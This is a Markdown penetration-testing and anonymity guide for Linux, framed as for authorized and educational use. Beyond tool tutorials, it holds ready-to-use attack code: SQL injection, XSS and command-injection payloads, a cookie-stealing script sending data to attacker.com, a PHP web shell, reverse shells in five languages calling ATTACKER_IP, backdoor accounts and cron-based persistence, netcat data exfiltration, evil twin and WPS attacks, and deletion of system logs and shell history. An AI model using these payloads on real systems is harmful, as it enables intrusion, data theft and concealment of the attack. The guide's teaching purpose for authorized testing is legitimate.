# The Comprehensive Linux Hacking & Anonymity Guide

**For Authorized Security Testing, Penetration Testing, and Educational Purposes Only**

---

## Table of Contents

1. [Introduction](#introduction)
2. [Linux Fundamentals for Security Professionals](#linux-fundamentals)
3. [Setting Up Your Hacking Environment](#setting-up-environment)
4. [Essential Hacking Tools](#essential-tools)
5. [Network Reconnaissance](#network-reconnaissance)
6. [Vulnerability Assessment](#vulnerability-assessment)
7. [Exploitation Techniques](#exploitation)
8. [Post-Exploitation](#post-exploitation)
9. [Anonymity & Privacy](#anonymity-privacy)
10. [Operational Security (OpSec)](#opsec)
11. [Advanced Techniques](#advanced-techniques)
12. [Legal and Ethical Considerations](#legal-ethical)

---

## Introduction

This guide provides comprehensive information on using Linux for authorized penetration testing, security research, and maintaining anonymity. **All techniques described should only be used in authorized contexts** such as:

- Authorized penetration testing engagements
- CTF (Capture The Flag) competitions
- Security research with proper authorization
- Educational purposes in controlled environments
- Defensive security operations

**Disclaimer:** Unauthorized access to computer systems is illegal. Always obtain written permission before testing any system you don't own.

---

## Linux Fundamentals for Security Professionals

### Why Linux for Hacking?

- **Open Source**: Full control over your operating system
- **Command Line Power**: Efficient automation and scripting
- **Tool Availability**: Most security tools are built for Linux
- **Customization**: Build specialized environments
- **Privacy**: Better control over data and processes

### Essential Linux Commands

#### File System Navigation
```bash
pwd                    # Print working directory
ls -la                 # List all files with details
cd /path/to/directory  # Change directory
find / -name "file"    # Find files
locate filename        # Quick file search (uses database)
```

#### File Operations
```bash
cat file.txt           # Display file contents
less file.txt          # View file with pagination
head -n 20 file.txt    # Show first 20 lines
tail -f /var/log/syslog # Follow log file in real-time
grep "pattern" file.txt # Search for pattern in file
```

#### System Information
```bash
uname -a               # System information
whoami                 # Current user
id                     # User ID and groups
ps aux                 # List all processes
top / htop             # Process monitoring
df -h                  # Disk usage
free -h                # Memory usage
```

#### Network Commands
```bash
ifconfig / ip a        # Network interfaces
netstat -tulpn         # Active connections
ss -tulpn              # Socket statistics (modern)
route -n               # Routing table
arp -a                 # ARP cache
```

#### User and Permissions
```bash
sudo command           # Execute as root
chmod 755 file         # Change permissions
chown user:group file  # Change ownership
passwd                 # Change password
su - username          # Switch user
```

### Linux File Permissions

Understanding permissions is crucial:

```
-rwxr-xr-x  1 user group 4096 Nov 16 file.txt
│││││││││
│││││││││
│││└┴┴┴┴┴── Others permissions (r-x = read, execute)
││└┴┴┴───── Group permissions (r-x = read, execute)
│└┴┴┴────── Owner permissions (rwx = read, write, execute)
└────────── File type (- = file, d = directory, l = link)
```

**Permission values:**
- Read (r) = 4
- Write (w) = 2
- Execute (x) = 1

Example: `chmod 644 file` = rw-r--r-- (owner: read+write, group: read, others: read)

---

## Setting Up Your Hacking Environment

### Best Linux Distributions for Security

#### 1. **Kali Linux** (Most Popular)
- Pre-installed with 600+ security tools
- Based on Debian
- Regular updates
- Excellent documentation

```bash
# Download from: https://www.kali.org/
# Verify ISO checksum before installation
sha256sum kali-linux-*.iso
```

#### 2. **Parrot Security OS**
- Lightweight alternative to Kali
- Privacy-focused
- Includes anonymity tools
- Good for older hardware

#### 3. **BlackArch Linux**
- Over 2800+ tools
- Based on Arch Linux
- For advanced users
- Can be installed as layer on existing Arch

#### 4. **Debian/Ubuntu** (Custom Setup)
- Start with minimal installation
- Install only tools you need
- Better understanding of each tool
- More stable for production use

### Virtual Machine Setup

**Recommended approach for beginners:**

```bash
# Install VirtualBox or VMware
# Create VM with:
- 4GB+ RAM
- 50GB+ disk space
- Bridged or NAT network (depending on use)
- Enable nested virtualization if needed
```

**Snapshots are crucial:**
- Take snapshot before major changes
- Create "clean" baseline snapshot
- Quick recovery from mistakes

### Essential Software Installation

```bash
# Update system first
sudo apt update && sudo apt upgrade -y

# Essential tools
sudo apt install -y \
    git curl wget \
    vim nano \
    net-tools \
    build-essential \
    python3 python3-pip \
    nmap wireshark \
    metasploit-framework \
    burpsuite \
    john hashcat \
    aircrack-ng \
    sqlmap \
    nikto \
    hydra
```

---

## Essential Hacking Tools

### Information Gathering

#### 1. **Nmap** - Network Scanner

```bash
# Basic scan
nmap 192.168.1.0/24

# Comprehensive scan
nmap -sS -sV -O -p- -T4 -A target.com

# Stealth scan
nmap -sS -T2 -f target.com

# Service version detection
nmap -sV --version-intensity 5 target.com

# Common ports
nmap -sS -F target.com

# Save output
nmap -oA scan_results target.com
```

**Nmap flags explained:**
- `-sS`: SYN stealth scan
- `-sV`: Version detection
- `-O`: OS detection
- `-p-`: All ports (1-65535)
- `-T4`: Timing (0=slowest, 5=fastest)
- `-A`: Aggressive scan (OS, version, scripts, traceroute)
- `-f`: Fragment packets
- `-oA`: Output all formats

#### 2. **Masscan** - Fast Port Scanner

```bash
# Scan entire network quickly
masscan 192.168.1.0/24 -p1-65535 --rate=1000

# Scan specific ports
masscan 10.0.0.0/8 -p80,443,8080,8443 --rate=10000
```

#### 3. **Reconnaissance Tools**

```bash
# Subdomain enumeration
sublist3r -d target.com

# DNS enumeration
dnsenum target.com
fierce --domain target.com

# WHOIS information
whois target.com

# TheHarvester (email, subdomain gathering)
theHarvester -d target.com -b all

# Shodan (search engine for Internet-connected devices)
shodan search "apache"
```

#### 4. **Web Application Reconnaissance**

```bash
# WhatWeb (identify technologies)
whatweb target.com

# Directory brute force
dirb http://target.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Nikto (web vulnerability scanner)
nikto -h http://target.com
```

### Vulnerability Assessment

#### 1. **Nessus / OpenVAS**

```bash
# OpenVAS installation (Kali)
sudo apt install openvas
sudo gvm-setup
sudo gvm-start

# Access at: https://localhost:9392
```

#### 2. **Nuclei** - Fast Vulnerability Scanner

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Run against target
nuclei -u https://target.com

# Use specific templates
nuclei -u https://target.com -t cves/ -t vulnerabilities/
```

### Network Analysis

#### 1. **Wireshark / Tcpdump**

```bash
# Tcpdump - capture traffic
sudo tcpdump -i eth0 -w capture.pcap

# Filter specific traffic
sudo tcpdump -i eth0 'port 80 or port 443'

# Read pcap file
tcpdump -r capture.pcap

# Wireshark (GUI)
sudo wireshark
```

#### 2. **Ettercap** - MITM Tool

```bash
# ARP poisoning
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# DNS spoofing
# Edit /etc/ettercap/etter.dns first
sudo ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.0/24//
```

### Password Attacks

#### 1. **John the Ripper**

```bash
# Crack /etc/shadow
sudo unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# Use wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

#### 2. **Hashcat** - GPU-Accelerated

```bash
# MD5 hash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# WPA/WPA2
hashcat -m 2500 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt

# Hash modes: -m 0 (MD5), -m 1000 (NTLM), -m 1800 (sha512crypt)
```

#### 3. **Hydra** - Network Login Cracker

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100
```

### Wireless Hacking

#### **Aircrack-ng Suite**

```bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (force handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Web Application Testing

#### 1. **Burp Suite**

```bash
# Start Burp Suite
burpsuite

# Configure browser to use proxy (127.0.0.1:8080)
# Intercept and modify HTTP requests
# Use Repeater, Intruder, Scanner
```

#### 2. **SQLMap** - SQL Injection Tool

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Test POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

#### 3. **XSStrike** - XSS Detection

```bash
xsstrike -u "http://target.com/search?q=test"
```

### Exploitation Frameworks

#### 1. **Metasploit Framework**

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search apache

# Use exploit
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.100
msf6 > set LPORT 4444
msf6 > exploit

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
```

#### 2. **SearchSploit** - Exploit Database

```bash
# Search for exploits
searchsploit apache 2.4

# Copy exploit to current directory
searchsploit -m exploits/linux/remote/1337.py

# Update database
searchsploit -u
```

---

## Network Reconnaissance

### Passive Reconnaissance

**No direct contact with target:**

```bash
# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"

# Shodan
shodan search "hostname:target.com"
shodan search "org:Company Name"

# Certificate transparency
# Visit: https://crt.sh/?q=%.target.com

# Archive.org Wayback Machine
# Historical data of website
```

### Active Reconnaissance

```bash
# DNS enumeration
dig target.com
dig target.com ANY
dig @8.8.8.8 target.com

# Zone transfer (rarely works now)
dig axfr @ns1.target.com target.com

# Reverse DNS
dig -x 192.168.1.1

# Subdomain brute force
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.target.com

# Port scanning (already covered in Nmap section)

# Banner grabbing
nc -v target.com 80
HEAD / HTTP/1.0

telnet target.com 25
```

---

## Vulnerability Assessment

### Web Application Vulnerabilities

#### SQL Injection Testing

```bash
# Manual testing
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--

# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,NULL FROM users--

# Time-based blind
' OR SLEEP(5)--
' OR BENCHMARK(1000000,MD5('A'))--
```

#### XSS (Cross-Site Scripting)

```html
<!-- Basic payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

<!-- Bypass filters -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
```

#### Command Injection

```bash
# Basic payloads
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# Blind command injection
; sleep 10
| ping -c 10 127.0.0.1
```

#### File Upload Vulnerabilities

```bash
# PHP shell
<?php system($_GET['cmd']); ?>

# Upload with different extensions
shell.php
shell.php.jpg
shell.php%00.jpg
shell.php;.jpg

# Change Content-Type
Content-Type: image/jpeg (but upload PHP file)
```

---

## Exploitation

### Reverse Shells

#### 1. **Bash Reverse Shell**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

#### 2. **Python Reverse Shell**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

#### 3. **Netcat Reverse Shell**

```bash
# Target machine
nc -e /bin/bash ATTACKER_IP 4444

# If -e not available
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

#### 4. **PHP Reverse Shell**

```php
<?php
$sock=fsockopen("ATTACKER_IP",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

#### 5. **PowerShell Reverse Shell**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
```

### Listener Setup

```bash
# Netcat listener
nc -lvnp 4444

# Metasploit listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

### Upgrading Shells

```bash
# From netcat to full TTY
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Post-Exploitation

### Linux Privilege Escalation

#### 1. **Enumerate System Information**

```bash
# OS version
cat /etc/issue
cat /etc/*-release
uname -a

# Kernel version
uname -r

# Current user
id
whoami

# Sudo permissions
sudo -l

# Users
cat /etc/passwd
cat /etc/shadow (if readable)

# Groups
cat /etc/group

# Running processes
ps aux
ps aux | grep root
```

#### 2. **SUID Binaries**

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Common SUID exploits
# Check GTFOBins: https://gtfobins.github.io/

# Examples:
# If find has SUID:
find . -exec /bin/bash -p \; -quit

# If vim has SUID:
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
```

#### 3. **Cron Jobs**

```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*

# Check for writable cron scripts
# Replace script with reverse shell
```

#### 4. **Writable /etc/passwd**

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt password123

# Add user with root privileges
echo 'hacker:$1$salt$qJH7.N4xYta3aEG/dfqo/.:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
```

#### 5. **Kernel Exploits**

```bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 4.4.0

# Download and compile exploit
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

#### 6. **Automated Enumeration**

```bash
# LinPEAS (Linux Privilege Escalation Awesome Script)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 1

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Windows Privilege Escalation

#### 1. **System Enumeration**

```powershell
# System info
systeminfo
hostname
whoami /priv
whoami /groups

# Network
ipconfig /all
route print
netstat -ano

# Users
net user
net localgroup administrators

# Running processes
tasklist /SVC
```

#### 2. **Automated Tools**

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

### Persistence

#### Linux Persistence

```bash
# SSH keys
mkdir /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Cron job
echo "* * * * * nc ATTACKER_IP 4444 -e /bin/bash" | crontab -

# Add user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor
```

#### Windows Persistence

```powershell
# Create user
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# Registry Run key
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru System
```

### Data Exfiltration

```bash
# Using netcat
nc -w 3 ATTACKER_IP 4444 < sensitive_data.txt

# Using Python HTTP server
python3 -m http.server 8000
# Access from attacker: wget http://TARGET_IP:8000/file

# Using SCP
scp sensitive_data.txt user@ATTACKER_IP:/tmp/

# Using base64 encoding
base64 file.txt | nc ATTACKER_IP 4444

# Using DNS exfiltration (advanced)
```

---

## Anonymity & Privacy

### The Tor Network

#### What is Tor?

Tor (The Onion Router) anonymizes internet traffic by routing it through multiple volunteer-operated servers.

#### Installing Tor

```bash
# Debian/Ubuntu
sudo apt install tor

# Start Tor service
sudo systemctl start tor
sudo systemctl enable tor

# Check status
sudo systemctl status tor
```

#### Using Tor Browser

```bash
# Download from: https://www.torproject.org/
# Extract and run
./start-tor-browser.desktop

# Or use torbrowser-launcher
sudo apt install torbrowser-launcher
torbrowser-launcher
```

#### Configuring Applications with Tor

```bash
# Configure application to use SOCKS5 proxy
# Host: 127.0.0.1
# Port: 9050

# Use torsocks to route any application through Tor
torsocks curl https://check.torproject.org/
torsocks wget http://example.com

# SSH through Tor
torsocks ssh user@hostname

# Nmap through Tor (slow, not recommended)
proxychains nmap -sT -Pn target.com
```

#### proxychains Configuration

```bash
# Edit /etc/proxychains.conf
sudo nano /etc/proxychains.conf

# Add at the end:
socks5 127.0.0.1 9050

# Use with any tool
proxychains firefox
proxychains curl https://check.torproject.org/
```

### VPN Services

#### Best VPNs for Privacy

1. **Mullvad** - No logs, anonymous payment (cash/crypto)
2. **ProtonVPN** - Swiss privacy laws, open source
3. **IVPN** - No logs, anonymous accounts

#### OpenVPN Setup

```bash
# Install OpenVPN
sudo apt install openvpn

# Connect to VPN
sudo openvpn --config client.ovpn

# Run in background
sudo openvpn --config client.ovpn --daemon

# Kill switch (prevent leaks if VPN drops)
sudo iptables -A OUTPUT ! -o tun0 -j DROP
```

### Whonix

**Ultimate anonymity:** Entire OS routed through Tor

```bash
# Download from: https://www.whonix.org/
# Two VMs:
# 1. Whonix-Gateway (Tor gateway)
# 2. Whonix-Workstation (isolated environment)

# All traffic from Workstation goes through Gateway via Tor
# No way to leak real IP
```

### Tails OS

**Amnesic live OS:** Leaves no trace

- Boots from USB
- Routes all traffic through Tor
- Stores nothing (unless configured)
- Contains privacy tools pre-installed

```bash
# Download from: https://tails.boum.org/
# Create bootable USB
# Boot from USB
# Everything erased on shutdown
```

### MAC Address Spoofing

```bash
# Check current MAC
ip link show eth0

# Disable interface
sudo ip link set dev eth0 down

# Change MAC address
sudo macchanger -r eth0

# Or manually
sudo ip link set dev eth0 address 00:11:22:33:44:55

# Enable interface
sudo ip link set dev eth0 up

# Permanent change (NetworkManager)
sudo nano /etc/NetworkManager/conf.d/wifi_rand_mac.conf

# Add:
[device]
wifi.scan-rand-mac-address=yes

[connection]
wifi.cloned-mac-address=random
ethernet.cloned-mac-address=random
```

### DNS Privacy

```bash
# Use encrypted DNS
# DNSCrypt-proxy
sudo apt install dnscrypt-proxy

# Configure to use encrypted DNS providers
sudo nano /etc/dnscrypt-proxy/dnscrypt-proxy.toml

# DNS over HTTPS (DoH)
# Firefox: Settings > Network Settings > Enable DNS over HTTPS

# DNS over TLS (DoT)
# Configure systemd-resolved
sudo nano /etc/systemd/resolved.conf

[Resolve]
DNS=1.1.1.1
DNSOverTLS=yes
```

### Encrypted Communications

#### Email

- **ProtonMail** - End-to-end encrypted
- **Tutanota** - Zero-knowledge encryption
- **PGP/GPG** - Encrypt any email

```bash
# Install GPG
sudo apt install gnupg

# Generate key pair
gpg --full-generate-key

# List keys
gpg --list-keys

# Export public key
gpg --export -a "Your Name" > public.key

# Encrypt file
gpg --encrypt --recipient "recipient@email.com" file.txt

# Decrypt file
gpg --decrypt file.txt.gpg
```

#### Messaging

- **Signal** - End-to-end encrypted, open source
- **Wire** - Encrypted, privacy-focused
- **Session** - Decentralized, anonymous

---

## Operational Security (OpSec)

### OpSec Principles

1. **Minimize Attack Surface**
   - Use minimal installations
   - Disable unnecessary services
   - Keep software updated

2. **Compartmentalization**
   - Separate identities for different purposes
   - Use different VMs for different tasks
   - Never mix personal and security research activities

3. **Least Privilege**
   - Don't run as root unnecessarily
   - Use sudo only when needed
   - Separate user accounts for different tasks

4. **Encryption Everything**
   - Full disk encryption
   - Encrypted communications
   - Encrypted backups

5. **Trust No One**
   - Verify downloads (checksums, signatures)
   - Use open source when possible
   - Audit code before running

### Full Disk Encryption (LUKS)

```bash
# During installation, enable encryption
# Or encrypt existing partition:

# Create encrypted partition
sudo cryptsetup luksFormat /dev/sdb1

# Open encrypted partition
sudo cryptsetup luksOpen /dev/sdb1 encrypted_drive

# Format with filesystem
sudo mkfs.ext4 /dev/mapper/encrypted_drive

# Mount
sudo mount /dev/mapper/encrypted_drive /mnt/encrypted
```

### Secure File Deletion

```bash
# Install shred (usually pre-installed)
# Securely delete file
shred -vfz -n 10 sensitive_file.txt

# Wipe entire drive
sudo shred -vfz /dev/sdb

# Alternative: wipe
sudo apt install wipe
wipe -rf sensitive_directory/
```

### Metadata Removal

```bash
# Install ExifTool
sudo apt install libimage-exiftool-perl

# View metadata
exiftool image.jpg

# Remove all metadata
exiftool -all= image.jpg

# For PDFs
sudo apt install mat2
mat2 --inplace document.pdf
```

### Browser Privacy

#### Firefox Hardening

```
# Enter about:config
# Set these preferences:

privacy.resistFingerprinting = true
privacy.trackingprotection.enabled = true
geo.enabled = false
media.peerconnection.enabled = false (disables WebRTC)
network.dns.disablePrefetch = true
network.prefetch-next = false
webgl.disabled = true
```

#### Browser Extensions

- **uBlock Origin** - Ad blocker
- **Privacy Badger** - Tracker blocker
- **HTTPS Everywhere** - Force HTTPS
- **NoScript** - Disable JavaScript selectively
- **Cookie AutoDelete** - Auto-delete cookies

### Secure Deletion of Logs

```bash
# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Clear system logs
sudo rm -rf /var/log/*

# Disable bash history (temporary)
unset HISTFILE

# Or prevent history for specific commands
# Add space before command:
  secret_command
```

---

## Advanced Techniques

### Pivoting and Port Forwarding

#### SSH Tunneling

```bash
# Local port forwarding
ssh -L 8080:target.com:80 user@jumpbox

# Remote port forwarding
ssh -R 8080:localhost:80 user@remote

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@jumpbox

# Use with proxychains
proxychains nmap -sT target.com
```

#### Metasploit Pivoting

```meterpreter
# Add route through meterpreter session
meterpreter > run autoroute -s 10.10.10.0/24

# Port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5

# SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > run
```

#### Chisel (Fast TCP/UDP tunnel)

```bash
# On attacker machine (server)
./chisel server -p 8000 --reverse

# On target machine (client)
./chisel client ATTACKER_IP:8000 R:8001:127.0.0.1:8001
```

### Container and VM Evasion

```bash
# Check if in Docker
if [ -f /.dockerenv ]; then
    echo "In Docker"
fi

# Check if in VM
systemd-detect-virt

# Anti-forensics
# Mount filesystem with noatime (don't update access times)
mount -o noatime,nodiratime /dev/sdb1 /mnt
```

### Custom Tool Development

#### Python for Hacking

```python
#!/usr/bin/env python3
import socket
import subprocess
import sys

# Simple port scanner
def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((host, port))
    s.close()
    return result == 0

# Scan range
for port in range(1, 1025):
    if scan_port("192.168.1.1", port):
        print(f"Port {port} is open")
```

#### Bash Scripting

```bash
#!/bin/bash
# Automated enumeration script

target=$1

echo "[*] Starting enumeration on $target"

echo "[*] Nmap scan"
nmap -sV -oN nmap_scan.txt $target

echo "[*] Directory brute force"
gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt

echo "[*] Subdomain enumeration"
sublist3r -d $target -o subdomains.txt

echo "[*] Done!"
```

### Wireless Hacking Advanced

#### Evil Twin Attack

```bash
# Create fake AP with same SSID
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Setup DHCP and DNS
# Capture credentials when users connect
```

#### WPS Attack

```bash
# Install Reaver
sudo apt install reaver

# Put interface in monitor mode
sudo airmon-ng start wlan0

# Wash - scan for WPS enabled networks
wash -i wlan0mon

# Attack WPS
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Binary Exploitation Basics

```bash
# Buffer overflow check
# Disable ASLR temporarily
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Use pattern_create (Metasploit)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61616161

# GDB debugging
gdb ./vulnerable_program
run $(python -c 'print "A"*100')
```

---

## Legal and Ethical Considerations

### Legal Framework

#### Computer Fraud and Abuse Act (CFAA) - USA

- Unauthorized access to computer systems is illegal
- Penalties include fines and imprisonment
- "Authorization" is key - always get written permission

#### Other Countries

- **UK**: Computer Misuse Act 1990
- **EU**: Directive 2013/40/EU
- **Canada**: Criminal Code Section 342.1

### Getting Authorization

#### Penetration Testing Agreement

Always have a written agreement that includes:

1. **Scope of work**
   - Which systems/networks are in scope
   - Which are explicitly out of scope
   - IP ranges, domains, applications

2. **Timeline**
   - Start and end dates
   - Specific time windows if required

3. **Methods allowed**
   - Social engineering permitted?
   - Physical security testing?
   - DoS attacks allowed?

4. **Emergency contacts**
   - Who to contact if issues arise
   - Escalation procedures

5. **Reporting**
   - Deliverables format
   - Timeline for reporting

### Bug Bounty Programs

Legal way to hack:

- **HackerOne** - https://www.hackerone.com/
- **Bugcrowd** - https://www.bugcrowd.com/
- **Synack** - https://www.synack.com/
- **Individual company programs** - Google, Facebook, Microsoft

**Rules:**
- Read the program rules carefully
- Stay within scope
- Report responsibly
- Don't disclose publicly before resolution

### Ethical Hacking Principles

1. **Do no harm**
   - Don't damage systems
   - Don't access more than necessary
   - Don't steal data

2. **Respect privacy**
   - Don't access personal information
   - Don't share findings inappropriately

3. **Be honest**
   - Report all findings
   - Don't hide vulnerabilities
   - Don't exaggerate severity

4. **Continuous learning**
   - Stay updated on latest threats
   - Learn from mistakes
   - Share knowledge responsibly

5. **Give back**
   - Contribute to open source
   - Help others learn
   - Improve security community

---

## Conclusion

This guide covers the fundamentals of Linux for security professionals, focusing on authorized penetration testing and maintaining privacy. Remember:

**Key Takeaways:**

1. Always get written authorization before testing
2. Stay within legal and ethical boundaries
3. Use multiple layers for anonymity (VPN + Tor)
4. Practice good OpSec at all times
5. Keep learning and stay updated
6. Document everything during engagements
7. Report vulnerabilities responsibly

### Resources for Continued Learning

#### Online Platforms

- **TryHackMe** - https://tryhackme.com/
- **HackTheBox** - https://www.hackthebox.eu/
- **PentesterLab** - https://pentesterlab.com/
- **OverTheWire** - https://overthewire.org/wargames/
- **VulnHub** - https://www.vulnhub.com/

#### Certifications

- **CEH** - Certified Ethical Hacker
- **OSCP** - Offensive Security Certified Professional
- **GPEN** - GIAC Penetration Tester
- **eJPT** - eLearnSecurity Junior Penetration Tester

#### Books

- "The Hacker Playbook 3" by Peter Kim
- "Penetration Testing" by Georgia Weidman
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Metasploit: The Penetration Tester's Guide" by David Kennedy

#### Communities

- **Reddit**: r/netsec, r/howtohack, r/AskNetsec
- **Discord**: NetSecFocus, TryHackMe, HackTheBox
- **Twitter**: Follow security researchers

### Final Words

Security is a continuous journey, not a destination. Stay curious, stay ethical, and always keep learning. Use these tools and techniques only for authorized purposes, and help make the internet a safer place.

**Stay safe, stay anonymous, stay legal!**

---

**Document Version:** 1.0
**Last Updated:** November 2025
**License:** For educational purposes only

